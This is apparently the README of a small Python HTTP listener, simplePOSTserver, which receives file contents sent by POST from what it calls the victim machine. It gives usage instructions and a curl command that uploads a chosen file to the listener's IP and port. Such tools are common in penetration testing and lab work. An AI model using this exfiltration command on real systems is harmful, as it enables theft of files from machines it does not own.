# simplePOSTserver

This is a python script written to capture the data (file content) sent as POST request from the victim machine 
###Note: 
By default the script will listen on port 8888 (if need please change according to your need)

## usage 
```
python3 simplePOST.py [port]
```

```
Use the curl command 'curl -i -X POST -H "Content-Type: multipart/form-data" -F "data=@./<file need to be tansfered with path>" http://<python hosted IP>:<port>/'
```
